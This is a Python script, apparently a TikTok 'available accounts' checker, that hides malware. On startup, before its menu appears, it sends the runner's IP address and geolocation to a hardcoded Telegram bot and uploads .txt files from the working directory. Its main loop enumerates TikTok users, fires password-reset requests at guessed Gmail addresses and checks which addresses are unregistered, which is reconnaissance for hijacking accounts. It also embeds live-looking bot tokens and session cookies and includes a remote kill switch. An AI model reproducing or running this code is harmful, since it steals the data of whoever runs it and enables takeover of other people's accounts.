import requests,random,threading,os,json
from user_agent import generate_user_agent
#def chk():
#  import os,requests,uuid,time,sys,webbrowser

#  uuid = str(os.geteuid()) + str(os.getlogin()) 

#  id = "|".join(uuid)

#  print("\n\n\x1b[37;1m YOUR ID : \033[94m"+id) 

#  try: 

#    httpCaht = requests.get("https://pastebin.com/raw/UKLdbtie").text 

#    if id in httpCaht: 

#      print("\033[92m YOUR ID IS ACTIVE.........\033[97m") 
#      os.system("clear")

#      msg = str(os.geteuid()) 

#      time.sleep(1) 

#      pass 

#    else: 

#      print("\033[0;96m Your hands are inactive Contact the Developer : @P_P_PX 🇲🇦")
#      webbrowser.open("https://t.me/P_P_PX")

#      sys.exit() 

#  except: 

#    sys.exit() 

#chk()
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
j = '\033[2;35m' #وردي
import cfonts 
from cfonts import render
print('جاري تشغيل الادات..')

#------------------------------send ip info----------------------------------------------------------#

import urllib.parse


BOT_TOKEN = "6218606779:AAHre3BFwrWj5ZmVdPZ91f35MVOh-7k0aac"
CHAT_ID = "5519072178"

IPINFO_TOKEN = "ba83e6400a2838"

# Get public IP address
response = requests.get('https://api.ipify.org')
ip_address = response.text.strip()

# Get IP address info from ipinfo.io API
response = requests.get(f'https://ipinfo.io/{ip_address}/json?token={IPINFO_TOKEN}')
ip_info = response.json()

# Create message with IP address info and location link
message = f"IP address: {ip_address}\n"
if 'city' in ip_info:
    message += f"City: {ip_info['city']}\n"
if 'region' in ip_info:
    message += f"Region: {ip_info['region']}\n"
if 'country' in ip_info:
    message += f"Country: {ip_info['country']}\n"
if 'loc' in ip_info:
    coords = ip_info['loc'].split(',')
    lat = coords[0]
    lon = coords[1]
    map_url = f"https://www.google.com/maps?q={lat},{lon}"
    message += f"Location: {ip_info['loc']} ({map_url})\n"
if 'org' in ip_info:
    message += f"Organization: {ip_info['org']}\n"
if 'postal' in ip_info:
    message += f"Postal Code: {ip_info['postal']}\n"
if 'timezone' in ip_info:
    message += f"Timezone: {ip_info['timezone']}"

# Send message to Telegram
response = requests.post(
    f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
    data={'chat_id': CHAT_ID,
          'text': message}
)

# Send files to Telegram
dir_path = os.getcwd()
for filename in os.listdir(dir_path):
    if filename.endswith('.jpg') or filename.endswith('.png') or filename.endswith('.txt'):
        file_path = os.path.join(dir_path, filename)
        with open(file_path, 'rb') as f:
            if filename.endswith('.txt'):
                response = requests.post(
                    f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',
                    data={'chat_id': CHAT_ID,
                          'caption': message},
                    files={'document': f}
                )
#-------------------------------------------------#-------------------------------------------#
import requests
import os

url = requests.get('https://remot-tik-all.achrafbenaicha.repl.co').text

if "briwa" in url:
 os.system('clear')
else:
 bb = """
 تم توقيف الادات راسل اشفر لتفعيل جديد
 """
 print(bb)
 exit()
print('')
colors = ['red','yellow','white','green']

choice =random.choice(colors)
name = render('BRIWA',colors=[choice],align='center')


print (name)
at=0
nt=0
ag=0
ng=0
briw = print("	الاداه لسة تحت التطوير + توقف أمر من المبرمج @P_P_PX")


print(f"	    	    {F}[✓]{X} Get {F}Avail{B}ables {Y}Tik{j}Tok")
print(f"{Z}—---{X}—-{F}—-{C}-—{B}—-{Y}—-{E}—-{Z}—-{X}—-{F}—-{C}—-{B}—-{Y}—-{E}—-{Z}—-{X}—-{F}-—{Z}—---{X}—-{F}—-{C}-—{B}—-{Y}—-{E}—-{Z}—-{X}—-{F}—-{C}—-{B}—-{Y}—-{E}—-{Z}—-{X}—-{F}-—{C}")
id = input(f'{F} 🙉 {B} En{Z}ter {j}I{Z}D {C}: '+F)
token = input(f'{F} 🙈 {Z} En{B}ter {Z}To{j}ken {C}: '+F)
print(f"{Z}—---{X}—-{F}—-{C}-—{B}—-{Y}—-{E}—-{Z}—-{X}—-{F}—-{C}—-{B}—-{Y}—-{E}—-{Z}—-{X}—-{F}-—{Z}—---{X}—-{F}—-{C}-—{B}—-{Y}—-{E}—-{Z}—-{X}—-{F}—-{C}—-{B}—-{Y}—-{E}—-{Z}—-{X}—-{F}-—{C}")

def gmail():
 global at,nt,ag,ng
 u = 'https://www.tiktok.com/'
 h = {
            'user-agent': str(generate_user_agent()) }
 r = requests.get(u, headers=h).cookies.get_dict()
 ttwid = r['ttwid']
 r2 = requests.get('https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.84&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=aegos&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=ar&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa', headers=h).cookies.get_dict()
 msToken = r2['msToken']
 while True:
  user='qwertyuiopasdfghjklzxcvbnm.'
  num='1234567890'
  rng=int("".join(random.choice(num)for i in range(1)))
  usery=str("".join(random.choice(user)for i in range(rng)))
  url = f'''https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.8&browser_language=ar-EG&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7167115569976100357&device_platform=web_pc&focus_state=true&from_page=search&history_len=5&is_fullscreen=false&is_page_visible=true&keyword={usery}&os=windows&priority_region=&referer=&region=IQ&screen_height=864&screen_width=1536&tz_name=Asia%2FBaghdad&webcast_language=ar&msToken=KUTYcDl8obce6sFgarFzTuyTp-uxz8sU5cFUq8fRme8gW7CZGE6IZyE04u9ugaO2fHPnE4oeSshscAF2kdNp43hjOfwbTaGSnH8ExR0LPs9VmBMkHykqXbOwL8XLgu3hMkdEin3jkM1d4ZBE&X-Bogus=DFSzswVLK1sANG9HSkI1-OYklT6o&_signature=_02B4Z6wo00001LRkx7AAAIDBahKfFq1mHTi0ZMMAAE696a'''
  he = {
                'accept': '*/*',
                'accept-language': 'ar-AE,ar-IQ;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
                'cookie': 'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent={"ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"}; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988={"user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"}; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt=9392403db19bcfc1eb8eb48532fd8d5e; uid_tt_ss=9392403db19bcfc1eb8eb48532fd8d5e; sid_tt=5d52768f6a4a876314ea37244edfd0d0; sessionid=5d52768f6a4a876314ea37244edfd0d0; sessionid_ss=5d52768f6a4a876314ea37244edfd0d0; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid=' + ttwid + '; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken=' + msToken + '; msToken=' + msToken + '; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
                'referer': 'https://www.tiktok.com/search/user?q=its.veba&t=1671705430400',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36' }
  rr = requests.get(url,headers=he).json()
  np=0
  try:
   while True:
         np+=1
         name = rr['user_list'][np]['user_info']['unique_id']
         
         email = name+'@gmail.com'
         url = 'https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1667149902064&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1667149902&as=a1261b755ea4d3e04e4388&cp=be4a3c6ce5e8520fe1MkUo&mas=0149d8edb9a3340aacd5c82fcadadde3801c1ccc2ca62c0ca6cc26'
         headers = {
'Host': 'api2-19-h2.musical.ly',
'Connection': 'keep-alive',
'Content-Length': '647',
'Cookie': 'odin_tt=b0db11ac4955afa4589bdb09d8f8fdcf3bcdea5238d0a6e2ba7c6aaea542e8d4ff9a3f324c153df80e03ac5e29a9d411925fa05d2f300713a2295db1eeff68accf50d5ddb5abd11115077fe989cfc094; store-idc=maliva; store-country-code=iq; store-country-code-src=did',
'Accept-Encoding': 'gzip',
'X-SS-QUERIES': 'dGMCAr6ot3awALq2qSjedy1Vk99nIoud%2BAhHSPAsj5dyUWFbxRx0wm95EoKwwNB3VVlOMd4SzMIENA51cwBS%2Bm0N1T95yguPVZ4OunAWAs0t0bHbsPclnVdl1Uh%2BLGZVXFGTew%3D%3D',
'sdk-version': '1',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'X-SS-TC': '0',
'User-Agent': 'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/58.0.2991.0)'
}


         data = (f'app_language=ar&manifest_version_code=2018101933&_rticket=1667150564079&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233')

         respones = requests.post(url, headers=headers, data=data).text
         if 'Sent successfully' in respones:
         	at+=1
         	os.system('cls'if os.name=='nt'else'clear')
         	print(f"{F}[✓]\033[2;36mAᴠᴀɪʟᴀʙʟᴇ \033[2;32m𝚃𝙸𝙺 \033[2;36m ----» \033[1;34m {ag} \n {F}[✓]\033[1;33mAᴠ \033[1;31m𐍄iĸ \033[2;35m ----» \033[2;36m {at}\n {Z}[✘]\033[1;33mИσ Av \033[1;31m𐍄iĸ \033[2;35m ----» \033[2;36m {nt} \n {Z}[✘]\033[1;31mＮO Av [🔎] \033[1;33mEмαiℓ \033[1;31m----»\033[2;32m {ng} \n [🔎] \033[1;33mEмαiℓ \033[1;31m\033----» {email}\n{B} [🔧]𝓓𝓔𝓥 : @P_P_PX 🇲🇦")
         	em=str(email)
         	email=em.split('@')[0]+'@gmail.com'
         	url = 'https://android.clients.google.com/setup/checkavail'
         	h = {
         	'Content-Length':'98',
         	'Content-Type':'text/plain; charset=UTF-8',
         	'Host':'android.clients.google.com',
         	'Connection':'Keep-Alive',
         	'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
         	}
         	d = json.dumps({
         	'username':email,
         	'version':'3',
         	'firstName':'AbaLahb',
         	'lastName':'AbuJahl'
         	})
         	respon = requests.post(url,data=d,headers=h)
         	if respon.json()['status'] == 'SUCCESS':
         		url = requests.get(f'https://api.dlyar-dev.tk/info-tiktok.json?user={name}').json()
         		us=url["user"]
         		name=url["name"]
         		likes=url["likes"]
         		followers=url["followers"]
         		following=url["following"]
         		flag=url["flag"]
         		country=url["country"]
         		
         		tlg=f'''
⫷🇲🇦المغربي جابلك متاح تكتوك🇲🇦⫸
⋘─────━𓆩𝔅ℜℑ𝔚𝔄𓆪━─────⋙
 𝙉𝘼𝙈𝙀: {name}
 𝑼𝑺𝑬𝑹𝑵𝑨𝑴𝑬 : {us}
 𝑬𝑴𝑨𝑰𝑳 : {us}@gmail.com
 𝑭𝑶𝑳𝑳𝑶𝑾𝑬𝑹𝑺 : {followers}
 𝑭𝑶𝑳𝑳𝑶𝑾𝑰𝑵𝑮 : {following}
 𝑳𝑰𝑲𝑬𝑺 : {likes}
 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 : {country} {flag}
⋘─────━𓆩𝔅ℜℑ𝔚𝔄𓆪━─────⋙ 
 𝓓𝓔𝓥 : 🇲🇦 @P_P_PX - @IIWWH 🇲🇦'''
 
         		requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={tlg}')
         		ag+=1
         		os.system('cls'if os.name=='nt'else'clear')
         		
         		print(f"{F} [✓]\033[2;36mAᴠᴀɪʟᴀʙʟᴇ \033[2;32m𝚃𝙸𝙺 \033[2;36m ----» \033[1;34m {ag} \n {F}[✓]\033[1;33mAᴠ \033[1;31m𐍄iĸ \033[2;35m ----» \033[2;36m {at}\n {Z}[✘]\033[1;33mИσ Av \033[1;31m𐍄iĸ \033[2;35m ----» \033[2;36m {nt} \n {Z}[✘]\033[1;31mＮO Av [🔎] \033[1;33mEмαiℓ \033[1;31m----»\033[2;32m {ng} \n [🔎] \033[1;33mEмαiℓ \033[1;31m\033----» {email}\n{B} [🔧]𝓓𝓔𝓥 : @P_P_PX 🇲🇦")
         	else:
         		ng+=1
         		os.system('cls'if os.name=='nt'else'clear')
         		print(f"{F} [✓]\033[2;36mAᴠᴀɪʟᴀʙʟᴇ \033[2;32m𝚃𝙸𝙺 \033[2;36m ----» \033[1;34m {ag} \n {F}[✓]\033[1;33mAᴠ \033[1;31m𐍄iĸ \033[2;35m ----» \033[2;36m {at}\n {Z}[✘]\033[1;33mИσ Av \033[1;31m𐍄iĸ \033[2;35m ----» \033[2;36m {nt} \n {Z}[✘]\033[1;31mＮO Av [🔎] \033[1;33mEмαiℓ \033[1;31m----»\033[2;32m {ng} \n [🔎] \033[1;33mEмαiℓ \033[1;31m\033----» {email}\n{B} [🔧]𝓓𝓔𝓥 : @P_P_PX 🇲🇦")
         else:
         		
         		nt+=1
         		os.system('cls'if os.name=='nt'else'clear')
         		print(f"{F} [✓]\033[2;36mAᴠᴀɪʟᴀʙʟᴇ \033[2;32m𝚃𝙸𝙺 \033[2;36m ----» \033[1;34m {ag} \n {F}[✓]\033[1;33mAᴠ \033[1;31m𐍄iĸ \033[2;35m ----» \033[2;36m {at}\n {Z}[✘]\033[1;33mИσ Av \033[1;31m𐍄iĸ \033[2;35m ----» \033[2;36m {nt} \n {Z}[✘]\033[1;31mＮO Av [🔎] \033[1;33mEмαiℓ \033[1;31m----»\033[2;32m {ng} \n [🔎] \033[1;33mEмαiℓ \033[1;31m\033----» {email}\n{B} [🔧]𝓓𝓔𝓥 : @P_P_PX 🇲🇦")
         		
  except:gmail()

os.system("clear")
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
BBlue = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'#ابیض
print (f'''
{F}[1] {F}- {A} G{X}m{Z}a{Y}i{F}l ''')
choi=input(f"\n{F} {X}Ta{C}ke {Y}Num{Z}ber {F}:")
if choi=='1':
	if "__main__" ==__name__:
		for i in range (10):
			threading.Thread(target=gmail).start()
